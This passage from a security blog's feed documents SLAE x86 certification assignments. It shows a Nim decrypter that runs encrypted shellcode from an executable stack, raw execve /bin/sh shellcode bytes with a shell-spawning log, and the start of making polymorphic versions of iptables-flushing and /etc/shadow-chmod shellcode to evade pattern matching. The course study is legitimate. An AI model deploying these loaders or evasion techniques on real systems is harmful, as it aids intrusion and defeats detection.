        &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc6ef3720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;countup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shl&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shr&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shl&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;shr&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The full source code can be found &lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/7/decrypter.nim&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once I compiled and ran the program, it would successfully decrypt back the encrypted shellcode, as shown below:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Compile for 32-bit systems and set the stack as executable&lt;/span&gt;
nim c &lt;span class=&quot;nt&quot;&gt;--hints&lt;/span&gt;:off &lt;span class=&quot;nt&quot;&gt;--cpu&lt;/span&gt;:i386 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;:-m32 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;:-m32 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;:-fno-stack-protector &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;'-z execstack'&lt;/span&gt; decrypter.nim

&lt;span class=&quot;c&quot;&gt;# Show help usage&lt;/span&gt;
./decrypter

&lt;span class=&quot;c&quot;&gt;# [+] Usage:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#         ./decrypter --input=encrypted.bin --key='0123456789abcdef' [--output=decrypted.bin] [--execute]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Decrypt encrypted data&lt;/span&gt;
./decrypter &lt;span class=&quot;nt&quot;&gt;--input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/encrypted.bin &lt;span class=&quot;nt&quot;&gt;--key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'0123456789abcdef'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/decrypted.bin

&lt;span class=&quot;c&quot;&gt;# [+] Input shellcode: /tmp/encrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Using encryption key: 0123456789abcdef&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Output file: /tmp/decrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Decrypted bytes: @[49, 192, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 83, 137, 225, 176, 11, 205, 128]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Writing decrypted shellcode to file: /tmp/decrypted.bin&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As you can see, the resulting shellcode, obtained from decrypting the encrypted shellcode, is identical the original one (unencrypted), meaning the program worked correctly.&lt;/p&gt;
&lt;p&gt;As regards running shellcode, it is a bit trickier ... maybe more than a bit. There are two problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sequences (dynamic arrays) are stored on the heap, which isn't set as executable&lt;/li&gt;
&lt;li&gt;arrays (fixed-size structures) are stored on the stack, which I've set as executable using the aforementioned flags (&lt;code&gt;-l:-fno-stack-protector -l:'-z execstack'&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Given I wanted to create a program that simply reads some shellcode (e.g. from a &lt;code&gt;shellcode.bin&lt;/code&gt; file) and executes it, I couldn't use arrays, which are of fixed size, as I've already mentioned. But I couldn't use sequences either, as the shellcode wouldn't be executable and the program would return &lt;code&gt;SIGSEGV&lt;/code&gt; (Segmentation Fault).&lt;/p&gt;
&lt;p&gt;The solution, although not very optimal, was to:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;use a very large array (in my case I chose &lt;code&gt;1024 bytes&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;copy the bytes inside this data structure&lt;/li&gt;
&lt;li&gt;set the &lt;code&gt;EIP&lt;/code&gt; register (Instruction Pointer) to the address of the first value of the array&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Setting the EIP register was yet another hurdle. I couldn't simply get the address and then jump right to it, but I had to create a function pointing to the address of the first value of the array.&lt;/p&gt;
&lt;p&gt;Follows the code that performs the execution of the shellcode, extracted from the program I linked previously:&lt;/p&gt;
&lt;div class=&quot;language-nim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;proc &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_empty_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_value&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypted_shellcode_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;shellcode_empty_array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_value&lt;/span&gt;
    
    &lt;span class=&quot;c&quot;&gt;# get the address of the decrypted shellcode&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_pointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ByteAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_empty_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;c&quot;&gt;# create a function pointing to this address&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;run_shellcode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cdecl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gcsafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.})&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cdecl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gcsafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# in my case the function echo is based on fwrite, so you can set a&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#   breakpoint on fwrite if you want to check the shellcode:&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#       gef&amp;gt; b *fwrite&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Running shellcode&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;run_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To test this new piece of code, I've created a file named &lt;code&gt;shellcode.bin&lt;/code&gt; containing the following shellcode (&lt;code&gt;execve&lt;/code&gt; of &lt;code&gt;/bin/sh&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you were to compile the program &lt;code&gt;decrypter.nim&lt;/code&gt; for 32-bit x86 systems, and execute it, it would spawn a &lt;code&gt;/bin/sh&lt;/code&gt; shell, as shown below:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbct@debian11:~/slae32/assignment/7&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./decrypter &lt;span class=&quot;nt&quot;&gt;--input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/encrypted.bin &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/decrypted.bin &lt;span class=&quot;nt&quot;&gt;--key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'0123456789abcdef'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# [+] Input shellcode: /tmp/encrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Using encryption key: 0123456789abcdef&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Output file: /tmp/decrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Decrypted bytes: @[49, 192, 80, 104, 110, 47, 115, 104, 104, 47, 47, 98, 105, 176, 11, 137, 227, 49, 201, 49, 210, 205, 128]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Writing decrypted shellcode to file: /tmp/decrypted.bin&lt;/span&gt;

rbct@debian11:~/slae32/assignment/7&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./decrypter &lt;span class=&quot;nt&quot;&gt;--input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/encrypted.bin &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/decrypted.bin &lt;span class=&quot;nt&quot;&gt;--key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'0123456789abcdef'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--execute&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# [+] Input shellcode: /tmp/encrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Using encryption key: 0123456789abcdef&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Output file: /tmp/decrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Decrypted bytes: @[49, 192, 80, 104, 110, 47, 115, 104, 104, 47, 47, 98, 105, 176, 11, 137, 227, 49, 201, 49, 210, 205, 128]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Writing decrypted shellcode to file: /tmp/decrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Running shellcode&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# rbct&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),113(bluetooth),118(scanner)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;rbct@debian11:~/slae32/assignment/7&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As you can see, running the program on a 32-bit x86 system, the program managed to decrypt and run the shellcode.&lt;/p&gt;
</description>
        <pubDate>Wed, 12 Jan 2022 00:00:00 +0100</pubDate>
        <link>/22/01/12/slae32-assignment-7</link>
        <guid isPermaLink="true">/22/01/12/slae32-assignment-7</guid>
        
        <category>slae</category>
        
        <category>x86</category>
        
        <category>assembly</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>nim</category>
        
        <category>encryption</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #6 Part 3</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 6th assignment requires you to analyze 3 shellcodes from &lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;Shell-Storm&lt;/a&gt; and &amp;quot;create polymorphic versions of them to beat pattern matching&amp;quot;.&lt;/p&gt;
&lt;p&gt;There's only 1 constraint:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The polymorphic versions cannot be larger 150% of the existing shellcode&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I chose the following shellcodes:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-812.php&quot;&gt;Linux/x86 - chmod 666 /etc/passwd &amp;amp; /etc/shadow - 57 bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-222.php&quot;&gt;Linux/x86 - setuid(0) setgid(0) execve(echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space) - 79 bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-825.php&quot;&gt;Linux/x86 - iptables --flush - 43 bytes&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In this part I'll create a polymorphic version of the 3rd shellcode.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source code&lt;/h2&gt;
&lt;p&gt;The files for this part of the assignment are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm&quot;&gt;original_shellcode.nasm&lt;/a&gt;, the original shellcode taken from Shell-Storm&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm&quot;&gt;polymorphic_shellcode.nasm&lt;/a&gt;, my polymorphic version of the shellcode above&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm&quot;&gt;test_polymorphic_shellcode.nasm&lt;/a&gt;, a &lt;code&gt;C&lt;/code&gt; program for testing the polymorphic shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;First, we need to analyse the original shellcode:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span 